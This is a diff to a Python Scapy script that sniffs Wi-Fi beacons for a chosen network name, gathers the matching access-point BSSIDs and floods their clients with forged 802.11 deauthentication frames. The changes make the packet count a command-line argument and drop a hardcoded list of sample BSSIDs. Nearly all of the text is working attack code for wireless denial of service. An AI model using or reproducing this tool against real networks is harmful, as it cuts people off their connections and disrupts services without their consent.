@@ -9,8 +9,8 @@ def inspect_packet(pkt):
 	if pkt.haslayer(Dot11Beacon):
 		bssid = pkt.getlayer(Dot11).addr2
 		if bssid not in target_bssids:
-			ssid = pkt.getlayer(Dot11Beacon).payload.info
-			if ssid == sys.argv[3]:
+			essid = pkt.getlayer(Dot11Beacon).payload.info
+			if essid == sys.argv[4]:
 				target_bssids.append(bssid)
 
 def deauth_clients(bssids):
@@ -19,7 +19,7 @@ def deauth_clients(bssids):
 		print "\nDeauthenticating clients from %s" % bssid
 		pkt = (RadioTap() / Dot11(type=0, subtype=12, addr1=dst_mac, addr2=bssid, addr3=bssid) 
 				/ Dot11Deauth(reason=1))
-		sendp(pkt, iface=sys.argv[1], count=5, inter=0.2)
+		sendp(pkt, iface=sys.argv[1], count=int(sys.argv[3]), inter=0.2)
 
 def select_bssids_to_deauth():
 	print "\nBSSIDs found:"
@@ -36,11 +36,10 @@ def select_bssids_to_deauth():
 		select_bssids_to_deauth()
 
 if __name__ == '__main__':
-	if len(sys.argv) != 4:
-		print "Use: %s <iface> <seconds> <ssid>" % sys.argv[0]
+	if len(sys.argv) != 5:
+		print "Use: %s <iface> <seconds> <count> <essid>" % sys.argv[0]
 		sys.exit(0)
 
-	print "Searching BSSIDs from %s..." % sys.argv[3]
+	print "Searching BSSIDs from %s..." % sys.argv[4]
 	sniff(iface=sys.argv[1], prn=inspect_packet, timeout=int(sys.argv[2]))
-	target_bssids = ['00:11:22:33:44:55', '11:22:33:44:55:66', '22:33:44:55:66:77', '33:44:55:66:77:88']
 	select_bssids_to_deauth()
